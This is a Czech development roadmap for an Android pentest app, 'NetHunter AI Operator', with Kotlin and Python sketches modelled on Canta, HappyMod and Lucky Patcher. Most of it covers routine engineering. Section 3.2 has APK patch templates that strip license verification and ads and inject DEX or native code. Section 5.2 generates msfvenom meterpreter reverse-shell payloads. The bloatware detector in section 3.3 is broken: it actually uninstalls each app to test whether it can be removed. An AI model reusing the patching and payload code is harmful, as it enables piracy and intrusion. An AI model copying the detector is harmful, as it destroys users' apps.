# 🐉 NetHunter AI Operator — Inspirační a Rozvojový Plán

> Dokument vznikl reverzní analýzou relevantních APK (Canta, HappyMod, Lucky Patcher)
> a aplikací jejich zkušeností na NetHunter AI Operator (`com.linux_core`).
>
> **Cíl:** Podrobný seznam inspirací, architektur a konkrétních implementačních kroků
> pro další vývoj aplikace.

---

## 📊 APK Zdroje Inspirace

| # | APK | Verze | Klíčová inspirace pro NetHunter |
|---|-----|-------|---------------------------------|
| 🎯 | **Canta** (org.samo_lego.canta) | 2.2.2 | Moderní target SDK, permission minimalismus, čistý Compose kód |
| 📦 | **HappyMod** (com.happymod.apk) | 3.1.4 | Download manager UX, background jobs, boot orchestrace |
| ⚡ | **Lucky Patcher** (ru.aaaaacah.installer) | 11.4.8 | Deep su workflow, appops management, APK modifikace |

---

## 🔴 1. Modernizace Android API (Inspirace: Canta)

### 1.1 Zvednout targetSdk z 28 → 35

**Současný stav:**
```
minSdk = 28
targetSdk = 28    ← 7 let staré API!
compileSdk = 36
```

**Proč je to kritické:**
- Google Play vyžaduje targetSdk 33+ od 2024
- Nové bezpečnostní modely (Android 12-15) nejsou aktivovány
- Uživatelé na Android 14+ vidí warning při instalaci APK

**Postup migrace:**

| Krok | Co se mění | Soubor |
|------|------------|--------|
| 1 | `targetSdk = 34` v `build.gradle.kts` | `app/build.gradle.kts` |
| 2 | Foreground service typy — přidat `foregroundServiceType` do manifestu | `AndroidManifest.xml` |
| 3 | Notification channel — přidat `POST_NOTIFICATIONS` runtime permission (Android 13+) | `MainActivity.kt` |
| 4 | Storage — přechod z `READ_EXTERNAL_STORAGE` na `MediaStore` API | všechny storage přístupy |
| 5 | AlarmManager — přechod na `SCHEDULE_EXACT_ALARM` nebo `USE_EXACT_ALARM` | if používáte alarmy |
| 6 | Otestovat VPN service pod novým modelem | `VpnNatEngine.kt` |

**Očekávané problémy:**
- `VpnService` chování se měnilo v Androidu 12+ (více omezení)
- `NotificationListenerService` v Android 14+ vyžaduje user grant v nastavení
- `AccessibilityService` v Android 14+ má omezení (Google bojuje proti zneužití)
- PRoot potřebuje `MANAGE_EXTERNAL_STORAGE` — to v targetSdk 35 stále funguje

### 1.2 Permission Audit (Inspirace: Canta)

**Canta má 3 permissions. NetHunter má 20+.**

**Cíl:** Rozdělit permissions do kategorií a oddělit ty, co nejsou potřeba pro core funkcionalitu.

```kotlin
// build.gradle.kts — rozdělení permissions podle funkcionality
android {
    defaultConfig {
        // CORE — vždy vyžadováno
        // INTERNET, ACCESS_NETWORK_STATE, FOREGROUND_SERVICE, WAKE_LOCK
        
        // VPN — nutné pro VpnService
        // (žádná extra permission, VpnService je systémová)
        
        // HARDWARE — runtime-only, nikdy v instalaci
        // CAMERA, RECORD_AUDIO, ACCESS_FINE_LOCATION, ACCESS_COARSE_LOCATION
        
        // STORAGE — pro PRoot
        // MANAGE_EXTERNAL_STORAGE (zůstává i v SDK 35)
        
        // SPECIAL — oddělit do samostatného modulu
        // PACKAGE_USAGE_STATS, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
    }
}
```

**Konkrétní návrh:**
1. Přesunout `CAMERA`, `RECORD_AUDIO` do runtime žádosti (už to děláte částečně)
2. `BLUETOOTH` — odstranit, pokud není používán
3. `ACCESS_BACKGROUND_LOCATION` — vyžadovat jen při aktivním location tracking
4. `PACKAGE_USAGE_STATS` — oddělit do samostatného modulu "Device Stats"
5. `READ_PHONE_STATE` — zvážit odstranění (používá se jen pro IMEI?)

### 1.3 Canta-like Shizuku integrace vzor

Canta používá Shizuku API čistě a minimalisticky. NetHunter už Shizuku má, ale může se inspirovat architekturou:

```kotlin
// Vzor z Canta — jak by mohl vypadat Shizuku service v NetHunter
class NetHunterShizukuService : ShizukuService() {
    override fun onShizukuConnected() {
        // Získání UID
        val uid = Process.myUid()  // shell nebo root
        
        if (uid == 0) {
            Log.i("NetHunter", "⚡ Shizuku: root UID — plný přístup")
        } else {
            Log.i("NetHunter", "⚡ Shizuku: shell UID — omezený přístup")
        }
    }
    
    fun runPrivilegedCommand(command: String): String {
        return Shizuku.newProcess(arrayOf("sh", "-c", command), null, null)?.let { process ->
            process.inputStream.bufferedReader().readText()
        } ?: "ERROR: Shizuku not available"
    }
}
```

---

## 🟡 2. Vylepšení UX a funkcionality (Inspirace: HappyMod)

### 2.1 Download Manager pro Rootfs Image

**Současný stav:**
- Stahování rootfs image probíhá přes HTTP bez pokročilé UX
- Žádná progress notifikace
- Žádné pause/resume

**HappyMod pattern:**
```kotlin
// DownloadService.kt — inspirováno HappyMod
class RootfsDownloadService : Service() {
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification = createDownloadNotification("Stahování Kali rootfs...")
        startForeground(DOWNLOAD_NOTIFICATION_ID, notification)
        
        // Download s progress
        downloadManager.enqueue(
            DownloadManager.Request(downloadUri).apply {
                setTitle("Kali Linux rootfs")
                setDescription("Stahování...")
                setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED)
                setAllowedOverMetered(true)
                setDestinationInExternalFilesDir(this@RootfsDownloadService, null, "kali-rootfs.tar.xz")
            }
        )
        
        return START_STICKY
    }
    
    private fun createDownloadNotification(progress: String): Notification {
        return NotificationCompat.Builder(this, CHANNEL_DOWNLOAD)
            .setContentTitle("NetHunter AI Operator")
            .setContentText(progress)
            .setSmallIcon(R.drawable.ic_download)
            .setProgress(0, 0, true)  // indeterminate
            .setOngoing(true)
            .build()
    }
}
```

**Feature návrh:**
- [ ] Foreground service s progress notifikací
- [ ] Možnost zvolit mirror server pro download
- [ ] Resume po přerušení (ETag / Range headers)
- [ ] Verifikace checksum (SHA256) po dokončení
- [ ] Automatická extrakce do PRoot adresáře

### 2.2 Boot Orchestrace a Background Jobs

**HappyMod ukazuje:**
```xml
<!-- AndroidManifest.xml recept -->
<receiver android:name=".BootReceiver">
    <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED" />
    </intent-filter>
</receiver>

<receiver android:name=".PowerReceiver">
    <intent-filter>
        <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
    </intent-filter>
</receiver>
```

**Feature návrh pro NetHunter:**
- [ ] Boot receiver: pokud byl PRoot spuštěn před restartem → restartovat
- [ ] Boot receiver: pokud byla VPN aktivní → restartovat
- [ ] WorkManager job: denní health check rootfs integrity
- [ ] WorkManager job: denní update AI modelu (AIBrain ONNX)
- [ ] Power connected: spustit stahování rootfs, pokud čeká
- [ ] Power connected: update databází (Nmap scripts, Metasploit)

### 2.3 Content Browser pro Nástroje

**HappyMod-like Feature:** Prohlížeč Kali nástrojů přímo v aplikaci.

```kotlin
// ToolBrowserFeature.kt
data class KaliTool(
    val name: String,
    val category: String,  // Information Gathering, Vulnerability Analysis, etc.
    val description: String,
    val isInstalled: Boolean,
    val installCommand: String,  // apt-get install ...
    val iconUrl: String?
)

class ToolBrowserViewModel : ViewModel() {
    val tools = listOf(
        KaliTool("nmap", "Information Gathering", "Network exploration tool", false, "apt install nmap", null),
        KaliTool("metasploit", "Exploitation", "Penetration testing framework", false, "apt install metasploit-framework", null),
        KaliTool("wireshark", "Sniffing", "Network protocol analyzer", false, "apt install wireshark", null),
        // ... 600+ nástrojů kategorizovaných
    )
    
    fun installTool(tool: KaliTool) {
        // Spustí apt-get install uvnitř PRoot
        terminalService.execute("apt-get install -y ${tool.installCommand}")
    }
}
```

---

## ⚡ 3. Pokročilé Systémové Funkce (Inspirace: Lucky Patcher)

### 3.1 appops GUI Manager

**Lucky Patcher umí:** `appops set <package> <op> <mode>`

**NetHunter už má:** CLI přes Shizuku (v terminálu)

**Chybí:** Grafické rozhraní pro správu appops všech aplikací.

```kotlin
// AppOpsManager.kt
class AppOpsShizukuManager {
    
    /** Získání seznamu všech aplikací s jejich appops */
    fun getAllPackagesWithOps(): List<AppOpEntry> {
        val packages = Shizuku.run("pm list packages -3")  // jen user apps
        return packages.map { pkg ->
            val ops = Shizuku.run("appops get $pkg")
            AppOpEntry(pkg, parseOps(ops))
        }
    }
    
    /** Nastavení konkrétního oprávnění */
    fun setOp(packageName: String, op: String, mode: String) {
        // mode: allow, deny, ignore, default
        Shizuku.run("appops set $packageName $op $mode")
    }
    
    /** Rychlé akce pro pentestery */
    fun denyAllNotifications(packageName: String) {
        setOp(packageName, "POST_NOTIFICATIONS", "deny")
    }
    
    fun denyLocation(packageName: String) {
        setOp(packageName, "ACCESS_FINE_LOCATION", "deny")
        setOp(packageName, "ACCESS_COARSE_LOCATION", "deny")
    }
    
    fun denyCamera(packageName: String) {
        setOp(packageName, "CAMERA", "deny")
    }
}
```

**Feature návrh:**
- [ ] GUI seznam všech nainstalovaných aplikací (jako Lucky Patcher)
- [ ] Per-app appops editor (toggle přepínače)
- [ ] Předvolby: "Social media lockdown", "Banking secure", "Gaming performance"
- [ ] Quick deny: Camera + Location + Microphone jedním tlačítkem
- [ ] Historie změn appops

### 3.2 APK Recompilation Engine

**Lucky Patcher core feature:** Modifikace APK (smali patching, license removal, ad removal).

**NetHunter jako pentest nástroj** by to mohl mít jako **killer feature**:

```kotlin
// ApkPatcher.kt
class ApkPatcher {
    
    /** Fáze 1: Rozbalení APK */
    fun decompile(apkFile: File): File {
        // apktool d app.apk -o app_unpacked/
        Shizuku.run("apktool d ${apkFile.absolutePath} -o ${apkFile.parent}/unpacked/")
        return File(apkFile.parent, "unpacked/")
    }
    
    /** Fáze 2: Aplikace patchů */
    fun applyPatches(unpackedDir: File, patches: List<ApkPatch>) {
        patches.forEach { patch ->
            when (patch.type) {
                PatchType.SMALI_REPLACE -> replaceSmaliCode(unpackedDir, patch)
                PatchType.MANIFEST_EDIT -> editManifest(unpackedDir, patch)
                PatchType.RESOURCE_REPLACE -> replaceResource(unpackedDir, patch)
                PatchType.LIB_INJECT -> injectLibrary(unpackedDir, patch)
                PatchType.DEX_INJECT -> injectDex(unpackedDir, patch)
            }
        }
    }
    
    /** Fáze 3: Rekompilace a podepsání */
    fun recompile(unpackedDir: File, outputApk: File) {
        // apktool b unpacked/ -o unsigned.apk
        Shizuku.run("apktool b ${unpackedDir.absolutePath} -o ${outputApk.parent}/unsigned.apk")
        
        // jarsigner
        Shizuku.run("jarsigner -keystore release.jks unsigned.apk releaseKey")
        
        // zipalign
        Shizuku.run("zipalign -v 4 unsigned.apk ${outputApk.absolutePath}")
    }
    
    /** Předpřipravené patch šablony */
    fun getBuiltinPatches(): List<ApkPatch> {
        return listOf(
            ApkPatch("Remove License Verification", PatchType.SMALI_REPLACE, 
                target = "Lcom/google/android/vending/licensing/LicenseChecker;",
                replacement = "always return LICENSED"),
            ApkPatch("Remove All Ads", PatchType.SMALI_REPLACE,
                target = "Lcom/google/ads/AdView;",
                replacement = "no-op stub"),
            ApkPatch("Enable Debug Mode", PatchType.MANIFEST_EDIT,
                target = "AndroidManifest.xml",
                replacement = "android:debuggable=\"true\""),
        )
    }
}

enum class PatchType { SMALI_REPLACE, MANIFEST_EDIT, RESOURCE_REPLACE, LIB_INJECT, DEX_INJECT }

data class ApkPatch(
    val name: String,
    val type: PatchType,
    val target: String,
    val replacement: String
)
```

**Feature návrh:**
- [ ] apktool + jarsigner + zipalign integrace v Termux PRoot
- [ ] GUI pro výběr APK k patchi
- [ ] Built-in patch šablony (remove license, remove ads, enable debug)
- [ ] Custom smali patches (pro pokročilé uživatele)
- [ ] Backup původního APK před patchem
- [ ] Instalace patchnutého APK přes Shizuku

### 3.3 Package Manager — System App Uninstaller

**Podobně jako Canta + Lucky Patcher:**

```kotlin
// PackageManagerShizuku.kt
class PrivilegedPackageManager {
    
    /** Seznam systémových appek (s bloatware detekcí) */
    fun getSystemApps(): List<AppInfo> {
        val output = Shizuku.run("pm list packages -s")  // system apps
        return output.lines().mapNotNull { line ->
            val pkg = line.removePrefix("package:")
            getAppInfo(pkg)
        }.sortedByDescending { it.isBloatware }
    }
    
    /** Detekce bloatware */
    private fun detectBloatware(packageName: String): BloatScore {
        val patterns = listOf(
            "facebook", "twitter", "tiktok", "instagram",
            "linkedin", "netflix", "spotify", "opra",
            "game", "facebook", "bixby", "duo",
            "gmail", "maps", "youtube", "chrome"
        )
        
        val score = patterns.count { packageName.contains(it, ignoreCase = true) }
        val isRemovable = Shizuku.run("pm uninstall --user 0 $packageName 2>&1")
            .contains("Success")
        
        return BloatScore(score, isRemovable)
    }
    
    /** Odinstalace systémové appky */
    fun uninstallSystemApp(packageName: String): Boolean {
        val result = Shizuku.run("pm uninstall --user 0 $packageName 2>&1")
        return result.contains("Success")
    }
    
    /** Reinstalace (pro omylem smazané) */
    fun reinstallSystemApp(packageName: String) {
        // pm install-existing <package>
        Shizuku.run("pm install-existing $packageName")
    }
}
```

**Feature návrh:**
- [ ] Canta-like seznam systémových appek s detekcí bloatware
- [ ] Bezpečnostní kategorie: "Safe to remove", "System critical", "Unknown"
- [ ] Hromadná odinstalace (batch remove)
- [ ] Možnost zálohy APK před smazáním
- [ ] Historie odinstalací (možnost vrátit zpět)

---

## 🔬 4. Vylepšení Stávajících Modulů

### 4.1 USB Host OTG — UI + SCM_RIGHTS (z existujícího plánu pokračovat)

**Současný stav v PLAN.md:** Už máte Fáze 1-4 rozepsané, některé hotové.

**Inspirace z Lucky Patcher:** Práce s file descriptorem přes SCM_RIGHTS je správná cesta.
Doplnit:

- [ ] UI panel pro USB zařízení (podobný `nh usb list` ale graficky)
- [ ] Indikátor připojeného zařízení v notifikační liště
- [ ] Auto-claim rozhraní pro známá VID:PID
- [ ] Log bulk transferů pro debugging

### 4.2 AI Brain — FunctionGemma jako On-Device Vrstva

**Z existujícího plánu:**
```
AIBrain (ONNX, Vrstva 1)
  → TrafficAggregator (SQLite dedup, Vrstva 2)
    → FunctionGemma 270M (ON-DEVICE, nová mezivrstva)
      → Cloud LLM (Claude/Gemma 27B, Vrstva 3)
```

**Inspirace z Canta:** Minimalismus a efektivita. FunctionGemma 270M běží přes `llama.cpp` v Termuxu, spotřeba < 200 MB RAM.

**Nový návrh:**
```python
# ai_agent.py — FunctionGemma wrapper
class FunctionGemmaArbiter:
    """Lehký on-device rozhodovač, který odfiltruje 80+ % případů."""
    
    MODEL_PATH = "/data/data/com.linux_core/files/functiongemma-270m-Q4_K_M.gguf"
    
    def __init__(self):
        self.llm = llama_cpp.Llama(
            model_path=self.MODEL_PATH,
            n_ctx=2048,      # malý kontext — stačí na jednu dávku
            n_threads=4,     # využije 4 jádra
            n_gpu_layers=0,  # CPU only (GPU by žralo baterii)
        )
    
    def decide(self, pending_flows: list) -> list:
        """Vrátí verdikty pro dávku flow. Eskaluje nejasné na cloud."""
        prompt = self._build_prompt(pending_flows)
        response = self.llm.create_chat_completion(
            messages=[{"role": "user", "content": prompt}],
            tools=TOOLS_DEFINITIONS,
            temperature=0.1,  # nízká teplota = konzistentní verdikty
        )
        
        results = self._parse_response(response)
        escalation = [r for r in results if r.confidence < 0.6]
        auto_decided = [r for r in results if r.confidence >= 0.6]
        
        return {
            "auto": auto_decided,       # >80 % případů
            "escalate": escalation,     # <20 % na cloud LLM
        }
```

### 4.3 Certificate Management UX

**Inspirace z Lucky Patcher:** Detailní správa certifikátů.

**Současný stav:** Pouze tlačítko "KOPÍROVAT CA" ve `VpnSecurityTab`.

**Návrh na vylepšení:**
- [ ] CA Installation Wizard (jako AdGuard)
- [ ] Status: nainstalováno / nenainstalováno / expiruje za N dní
- [ ] Možnost vygenerovat nový CA pár v AndroidKeyStore
- [ ] Import/export CA certifikátu (PEM, DER, PKCS12)
- [ ] Seznam podepsaných server certifikátů (MITM sessions)
- [ ] Expirační notifikace (30 dní před koncem platnosti CA)

```kotlin
// CertificateManagerUI.kt
@Composable
fun CertificateManagementScreen(certManager: CertificateManager) {
    val caCert = certManager.getCaCertificate()
    val expiryDays = caCert?.let { 
        TimeUnit.MILLISECONDS.toDays(it.notAfter.time - System.currentTimeMillis())
    }
    
    Column {
        // Status card
        Card {
            Row {
                Icon(Icons.Default.Security, "CA Status")
                Column {
                    Text("MITM Certificate Authority")
                    Text("Expires: ${caCert?.notAfter}")
                    if (expiryDays != null && expiryDays < 30) {
                        Text("⚠️ Expires in $expiryDays days", color = Color.Red)
                    }
                }
            }
        }
        
        // Actions
        Button("Generate New CA") { 
            certManager.generateNewCaInKeyStore() 
        }
        Button("Export CA Certificate") { 
            certManager.exportToFile() 
        }
        Button("Open Installation Guide") { 
            showInstallationWizard() 
        }
        
        // Signed certs list
        LazyColumn {
            items(certManager.getSignedCertificates()) { cert ->
                CertificateItem(cert)
            }
        }
    }
}
```

---

## 🧪 5. Experimentální Funkce (Future Roadmap)

### 5.1 XFCE jako Android Launcher (z existujícího plánu)

Zachovat a rozšířit:
- [ ] VNC View integrace (bVNC core)
- [ ] FREE form Window Management pro Android appky
- [ ] Sidebar s Android apps
- [ ] Klávesové zkratky pro přepínání mezi Linux a Android

### 5.2 Automatic Payload Generator

**Inspirace z Lucky Patcher + NetHunter pentest poslání:**

```kotlin
// PayloadGenerator.kt
class PayloadGenerator {
    fun generateMsfvenom(lhost: String, lport: Int, platform: Platform): File {
        val payload = when (platform) {
            Platform.ANDROID -> "android/meterpreter/reverse_tcp"
            Platform.LINUX -> "linux/x64/meterpreter_reverse_tcp"
            Platform.WINDOWS -> "windows/x64/meterpreter_reverse_tcp"
        }
        
        val output = File(cacheDir, "payload_${platform.name}_$lport.apk")
        
        terminalService.execute(
            "msfvenom -p $payload LHOST=$lhost LPORT=$lport " +
            "-o ${output.absolutePath}"
        )
        
        return output
    }
}
```

### 5.3 Session Manager — Lucky Patcher Backup Styl

**Cíl:** Ukládat a obnovovat kompletní PRoot session včetně:
- Nainstalovaných balíčků
- Konfiguračních souborů
- Network nastavení
- AI Brain databáze

```kotlin
// SessionManager.kt
class SessionBackupManager {
    fun createSnapshot(name: String): Snapshot {
        val timestamp = System.currentTimeMillis()
        val backupDir = File(sdcardDir, "NetHunter/backups/$name-$timestamp")
        
        return Snapshot(
            name = name,
            packages = getInstalledPackages(),  // dpkg --get-selections
            configs = backupConfigFiles(),
            vpnSettings = vpnSettings.export(),
            brainData = aiBrain.exportKnowledge(),
            timestamp = timestamp,
            sizeBytes = 0  // dopočítat
        )
    }
    
    fun restoreSnapshot(snapshot: Snapshot) {
        // 1. Obnovit balíčky
        restorePackages(snapshot.packages)
        
        // 2. Obnovit konfigurace
        restoreConfigFiles(snapshot.configs)
        
        // 3. Obnovit VPN nastavení
        vpnSettings.import(snapshot.vpnSettings)
        
        // 4. Obnovit AI Brain
        aiBrain.importKnowledge(snapshot.brainData)
    }
}
```

### 5.4 Network Profile Switcher

**Jako HappyMod profilová tlačítka, ale pro síťové scénáře:**

| Profil | VPN | MITM | AI Brain | Firewall | Použití |
|--------|-----|------|----------|----------|---------|
| 🛡️ **Stealth** | ON | OFF | ON (aggressive) | Block all unknown | Běžná bezpečnost |
| 🔍 **Recon** | ON | ON (capture) | ON (logging) | Allow all | Skenování sítě |
| 🚀 **Gaming** | OFF | OFF | OFF | Allow all | Nízká latence |
| 🔐 **Banking** | ON | OFF | ON | Block all except banking | Finanční transakce |
| 🧪 **Test** | OFF | ON (full) | OFF | Allow all | Vývoj a testování |

```kotlin
// NetworkProfile.kt
data class NetworkProfile(
    val name: String,
    val icon: String,
    val vpnEnabled: Boolean,
    val mitmMode: MitmMode,        // OFF, CAPTURE_ONLY, FULL
    val aiBrainMode: AiMode,       // OFF, LOGGING, ACTIVE
    val firewallPolicy: FirewallPolicy  // ALLOW_ALL, BLOCK_UNKNOWN, STRICT
)

class ProfileSwitcher {
    fun applyProfile(profile: NetworkProfile) {
        when (profile.vpnEnabled) {
            true -> vpnManager.start()
            false -> vpnManager.stop()
        }
        
        when (profile.mitmMode) {
            MitmMode.CAPTURE_ONLY -> mitmEngine.startCaptureOnly()
            MitmMode.FULL -> mitmEngine.startFull()
            MitmMode.OFF -> mitmEngine.stop()
        }
        
        // ... atd
    }
}
```

---

## 📋 6. Technický Dluh — Priority

### 🔴 Ihned (sprint 1-2)

| # | Úkol | Inspirace | Odhad |
|---|------|-----------|-------|
| 1 | Zvednout targetSdk na 35 | Canta | 2-3 dny |
| 2 | Přidat progress notifikaci pro rootfs download | HappyMod | 1 den |
| 3 | Permission audit — oddělit runtime-only | Canta | 0.5 dne |

### 🟡 Do měsíce (sprint 3-4)

| # | Úkol | Inspirace | Odhad |
|---|------|-----------|-------|
| 4 | appops GUI manager | Lucky Patcher | 3-4 dny |
| 5 | Boot orchestrace (WorkManager) | HappyMod | 2 dny |
| 6 | FunctionGemma on-device arbiter | (vlastní) | 5-7 dní |
| 7 | Certificate Installation Wizard | AdGuard (z CA analysis) | 2 dny |

### 🟢 Do kvartálu

| # | Úkol | Inspirace | Odhad |
|---|------|-----------|-------|
| 8 | APK Recompilation Engine | Lucky Patcher | 2-3 týdny |
| 9 | Network Profile Switcher | (vlastní) | 1 týden |
| 10 | XFCE Android Launcher | (z existujícího plánu) | 2-3 týdny |
| 11 | Session Backup Manager | Lucky Patcher | 1 týden |

---

## 📐 7. Architektonické Diagramy

### 7.1 AppOps Manager — architektura

```
┌──────────────────────────────────────────────┐
│  AppOpsScreen.kt (Compose UI)                │
│  ┌────────────────────────────────────────┐  │
│  │  SearchBar                             │  │
│  │  ┌────────────────────────────────┐    │  │
│  │  │  AppItem(pkg, opCount, score)  │    │  │
│  │  │  AppItem(pkg, opCount, score)  │    │  │
│  │  │  ...                           │    │  │
│  │  └────────────────────────────────┘    │  │
│  └────────────────────────────────────────┘  │
│                      │                        │
│              click na appku                   │
│                      ▼                        │
│  ┌────────────────────────────────────────┐  │
│  │  AppOpsDetailSheet                     │  │
│  │  ┌──────┬─────────────────────────┐    │  │
│  │  │ Op   │ Toggle allow/deny      │    │  │
│  │  │ CAM  │ [ALLOW] [DENY]         │    │  │
│  │  │ LOC  │ [ALLOW] [DENY]         │    │  │
│  │  │ MIC  │ [ALLOW] [DENY]         │    │  │
│  │  │ PHONE│ [ALLOW] [DENY]         │    │  │
│  │  │ SMS  │ [ALLOW] [DENY]         │    │  │
│  │  └──────┴─────────────────────────┘    │  │
│  │  [Three Finger Lockdown]               │  │
│  └────────────────────────────────────────┘  │
└──────────────────────────────────────────────┘
         │                     ▲
         ▼                     │
┌──────────────────────────────────────────────┐
│  AppOpsShizukuManager.kt                    │
│  ┌────────────────────────────────────────┐ │
│  │  getAllPackagesWithOps()                │ │
│  │  getAppOpsForPackage(pkg)              │ │
│  │  setOp(pkg, op, mode)                  │ │
│  │  lockdownThreeFingers(pkg)             │ │
│  └────────────────────────────────────────┘ │
└──────────────────────────┬───────────────────┘
                           │
                    ┌──────▼──────┐
                    │  Shizuku    │
                    │  API        │
                    └──────┬──────┘
                           │
                    ┌──────▼──────┐
                    │  appops     │
                    │  (Android)  │
                    └─────────────┘
```

### 7.2 Downlad Manager Pipeline

```
User clicks "Download Kali"
         │
         ▼
┌──────────────────┐
│  DownloadService │─── startForeground ───▶  [🔽 Kali rootfs 45%]
│  .kt             │                         [Notification]
└──────┬───────────┘
       │
       ├─▶ HTTP GET (Range: bytes=N-)
       │    │
       │    ├─▶ Progress → Notification update
       │    ├─▶ Pause → save Range offset
       │    └─▶ Complete → verify SHA256
       │
       ├─▶ [OK] → extract to PRoot directory
       │    │
       │    ├─▶ tar -xJf kali-rootfs.tar.xz -C ~/kali-arm64/
       │    └─▶ rm kali-rootfs.tar.xz
       │
       └─▶ [FAIL] → Notification + retry after 30s
```

---

## 🏆 8. Shrnutí — Co si vzít z každého APK

| APK | Hlavní ponaučení | Implementovat jako |
|-----|------------------|--------------------|
| **Canta** | Moderní Android, čistý kód, málo permissions | targetSdk 35, permission audit, Shizuku best practices |
| **HappyMod** | Download UX, background orchestrace, notifikace | Rootfs download manager, WorkManager jobs, boot receiver |
| **Lucky Patcher** | System-level modifikace, appops, APK patching | AppOps GUI, APK Recompiler, Package Manager |

---

## 📎 Příloha: Existující Komponenty (co už máte a na co navázat)

```kotlin
// AIBrain.kt — ONNX klasifikátor
// TlsMitmEngine.kt — MITM engine
// RootCaInstaller.kt — CA management
// VpnNatEngine.kt — VPN NAT
// Shizuku — již integrován
// BackupService.kt — backup (rozšířit)
// OffensiveEngine.kt — notifikace s timeoutem
// LocalApiServer.kt — API bridge port 1337
// ai-agent.py — ReAct agent port 13338
```

---

*Dokument vytvořen 2026-07-17 na základě reverzní analýzy APK a existující dokumentace projektu.*
